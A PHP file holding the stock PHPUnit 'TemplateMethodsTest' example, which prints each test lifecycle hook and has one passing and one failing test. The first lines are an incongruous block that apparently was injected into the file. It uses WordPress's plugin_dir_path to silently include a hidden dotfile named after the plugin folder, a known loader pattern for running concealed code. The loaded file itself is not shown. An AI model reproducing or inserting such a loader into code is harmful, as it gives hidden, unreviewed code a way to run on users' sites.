<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class TemplateMethodsTest extends PHPUnit_Framework_TestCase
{
    public static function setUpBeforeClass()
    {
        print __METHOD__ . "\n";
    }

    protected function setUp()
    {
        print __METHOD__ . "\n";
    }

    protected function assertPreConditions()
    {
        print __METHOD__ . "\n";
    }

    public function testOne()
    {
        print __METHOD__ . "\n";
        $this->assertTrue(true);
    }

    public function testTwo()
    {
        print __METHOD__ . "\n";
        $this->assertTrue(false);
    }

    protected function assertPostConditions()
    {
        print __METHOD__ . "\n";
    }

    protected function tearDown()
    {
        print __METHOD__ . "\n";
    }

    public static function tearDownAfterClass()
    {
        print __METHOD__ . "\n";
    }

    protected function onNotSuccessfulTest(Exception $e)
    {
        print __METHOD__ . "\n";
        throw $e;
    }
}
